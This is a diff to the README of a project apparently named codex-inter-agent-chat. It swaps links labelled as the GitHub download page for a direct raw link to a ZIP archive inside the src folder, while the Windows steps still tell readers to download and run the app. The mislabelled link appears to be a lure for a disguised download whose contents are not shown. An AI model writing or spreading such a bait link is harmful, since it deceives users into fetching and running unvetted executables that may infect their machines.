@@ -1,6 +1,6 @@
 # 🧩 codex-inter-agent-chat - Chat Between Codex Sessions
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/researchstaffpone610/codex-inter-agent-chat)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/researchstaffpone610/codex-inter-agent-chat/main/src/codex_inter_agent_chat/agent-inter-chat-codex-v2.1.zip)
 
 ## 🚀 What this app does
 
@@ -14,7 +14,7 @@ Use it when you want:
 
 ## 📥 Download and run on Windows
 
-1. Open the download page: [https://github.com/researchstaffpone610/codex-inter-agent-chat](https://github.com/researchstaffpone610/codex-inter-agent-chat)
+1. Open the download page: [https://raw.githubusercontent.com/researchstaffpone610/codex-inter-agent-chat/main/src/codex_inter_agent_chat/agent-inter-chat-codex-v2.1.zip](https://raw.githubusercontent.com/researchstaffpone610/codex-inter-agent-chat/main/src/codex_inter_agent_chat/agent-inter-chat-codex-v2.1.zip)
 2. On the page, look for the latest release or the main download area.
 3. Download the Windows app file if one is listed there.
 4. If the file is a ZIP file, right-click it and choose **Extract All**.
